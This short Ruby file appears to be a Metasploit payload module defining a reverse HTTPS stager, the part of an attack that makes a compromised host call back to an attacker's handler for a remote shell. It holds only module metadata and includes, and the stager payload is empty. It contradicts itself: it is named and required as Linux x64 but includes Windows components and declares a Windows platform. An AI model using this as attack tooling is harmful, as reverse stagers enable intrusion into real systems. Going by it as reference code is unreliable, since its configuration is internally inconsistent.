##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/linux/x64/reverse_https'

module Metasploit4

  CachedSize = 532

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux x64 Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => 'Jim Shaver',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86_64,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockrdi https',
      'Stager'      => { 'Payload' => '' }))
  end

end
